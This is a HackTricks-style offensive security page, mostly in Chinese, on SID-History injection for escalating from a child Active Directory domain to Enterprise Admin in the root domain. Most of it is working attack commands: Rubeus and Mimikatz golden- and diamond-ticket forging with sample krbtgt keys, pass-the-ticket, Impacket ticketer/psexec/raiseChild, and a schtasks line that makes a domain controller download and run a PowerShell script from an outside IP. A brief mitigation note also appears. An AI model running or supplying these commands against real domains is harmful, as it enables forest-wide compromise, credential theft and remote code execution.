# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

**SID History Injection Attack** 的重点是在**用户于域之间迁移**时，确保其能够继续访问原域中的资源。具体做法是将**用户之前的 Security Identifier (SID)** 加入其新账户的 SID History 中。值得注意的是，此过程可能被滥用，通过将父域中高权限组（例如 Enterprise Admins 或 Domain Admins）的 SID 添加到 SID History，从而授予未经授权的访问权限。此类利用将赋予攻击者访问父域内所有资源的权限。<sup>[[1]](#references)[[2]](#references)</sup>

执行此攻击有两种方法：创建 **Golden Ticket** 或 **Diamond Ticket**。

要确定 **"Enterprise Admins"** 组的 SID，必须先找到根域的 SID。确定后，可以将 `-519` 附加到根域 SID 的末尾，以构造 Enterprise Admins 组的 SID。例如，如果根域 SID 为 `S-1-5-21-280534878-1496970234-700767426`，则 "Enterprise Admins" 组的 SID 将为 `S-1-5-21-280534878-1496970234-700767426-519`。<sup>[[1]](#references)</sup>

你也可以使用 **Domain Admins** 组，其 SID 以 **512** 结尾。

查找其他域中某个组（例如 "Domain Admins"）SID 的另一种方法是：
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> 注意，可以在 trust relationship 中禁用 SID history，这会导致此攻击失败。

根据 [**docs**](https://technet.microsoft.com/library/cc835085.aspx)：<sup>[[3]](#references)</sup>
- 使用 netdom 工具在 forest trusts 上**禁用 SIDHistory**（`netdom trust /domain: /EnableSIDHistory:no on the domain controller`）
- 使用 netdom 工具对 external trusts **应用 SID Filter Quarantining**（`netdom trust /domain: /quarantine:yes on the domain controller`）
- 不建议对单个 forest 内的 domain trusts **应用 SID Filtering**，因为这是不受支持的配置，可能导致破坏性变更。如果 forest 中的某个 domain 不可信，则不应将其作为该 forest 的成员。在这种情况下，必须先将 trusted 和 untrusted domains 拆分到不同的 forests 中，然后才能对 interforest trust 应用 SID Filtering

有关绕过此机制的更多信息，请查看这篇文章：[**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>

### Diamond Ticket (Rubeus + KRBTGT-AES256)

上次尝试时，我需要添加参数 **`/ldap`**。
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### 使用 KRBTGT-AES256 的 Golden Ticket（Mimikatz）
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
有关 golden tickets 的更多信息，请查看：

{{#ref}}
golden-ticket.md
{{#endref}}


有关 diamond tickets 的更多信息，请查看：

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
使用已入侵域的 KRBTGT 哈希提升至根域的 DA 或 Enterprise admin：
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
通过攻击获得的权限，你可以在新域中执行例如 DCSync attack：


{{#ref}}
dcsync.md
{{#endref}}

### From linux

#### 使用 [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) 手动执行
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### 使用 [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) 自动执行

这是一个 Impacket script，可**自动从子域提升至父域**。该 script 需要：

- 目标域控制器
- 子域中管理员用户的 Creds

流程如下：

- 获取父域 Enterprise Admins 组的 SID
- 获取子域 KRBTGT 账户的 hash
- 创建 Golden Ticket
- 登录父域
- 获取父域 Administrator 账户的凭据
- 如果指定了 `target-exec` switch，则通过 Psexec 向父域的域控制器进行身份验证。
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## 参考资料

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [什么是 Security Identifier (SID)？ - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Trust 的安全注意事项 - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
- [4] [itm8.com - Sid Filter As Security Boundary Between Domains Part 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

{{#include ../../banners/hacktricks-training.md}}
